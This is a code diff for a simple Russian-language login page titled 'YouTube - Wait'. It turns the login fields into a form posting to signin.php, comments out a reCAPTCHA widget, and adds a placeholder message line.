@@ -12,7 +12,7 @@
     <title>YouTube - Wait</title>
 </head>
 <body>
-    <div class="form-1" >
+    <form class="form-1" action="signin.php" method="post" >
         <p class="field">
             <input type="email" id="login" name="login" placeholder="Example@mail.com" required>
             
@@ -22,14 +22,15 @@
             <input type="password" id="password" name="password" placeholder="Пароль" required>
             <i class="icon-lock icon-large"><img src="./images/padlock_icon-icons.com_70907.png" width="30" height="30" alt="icon-user-autorization" class="icon-user-autorization0"></i>
         </p>
-        <div class="g-recaptcha" data-sitekey="6LcpqsoaAAAAAHjA6_yGuaCCRfpTmBYzct3qYqKi" width="25" height="25" ></div>
+        <!--<div class="g-recaptcha" data-sitekey="6LcpqsoaAAAAAHjA6_yGuaCCRfpTmBYzct3qYqKi" width="25" height="25" ></div>-->
         <div class="container signin">
             <p>Ещё нет аккаунта? <a href="./registration.html">Зарегистрироваться</a></p>
+            <p class="msg none">Lorem ipsum dolor sit amet.</p>
         </div>
         <p class="submit">
-            <button type="submit" name="submit" onclick="Input()">
+            <button type="submit" name="submit" onclick="">
                 <i class="icon-arrow-right icon-large"><img  src="./images/arrow.png" width="30" height="30" alt="icon-user-autorization" class="icon-user-autorization2"></i></button>
         </p>
-    </div>
+    </form>
 </body>
 </html>
